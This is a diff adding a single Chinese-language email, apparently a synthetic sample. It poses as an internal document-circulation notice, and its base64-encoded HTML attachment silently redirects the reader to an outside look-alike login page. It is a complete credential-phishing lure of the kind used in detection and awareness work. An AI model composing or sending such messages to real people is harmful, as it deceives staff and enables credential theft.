@@ -1,0 +1,19 @@
+From: =?utf-8?B?55S15a2Q5YWs5paH?= <doc@oa-notice.example>
+To: office@corp.internal
+Date: Tue, 25 Aug 2026 10:20:00 +0800
+Message-ID: <0000-b2@synth.example>
+Subject: 内部文件传阅
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+各部门：传阅文件见附件，打开后按页面提示登录阅办。
+--BS
+Content-Type: text/html
+Content-Disposition: attachment; filename="传阅文件.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGhlYWQ+PG1ldGEgaHR0cC1lcXVpdj0ncmVmcmVzaCcgY29udGVudD0nMDt1cmw9aHR0cHM6Ly9vYS1yZWFkLmV4YW1wbGUuaW5mby9hdXRoJz48L2hlYWQ+PGJvZHk+5q2j5Zyo5omT5byA6ZiF5Yqe57O757uf4oCmPC9ib2R5PjwvaHRtbD4=
+--BS--
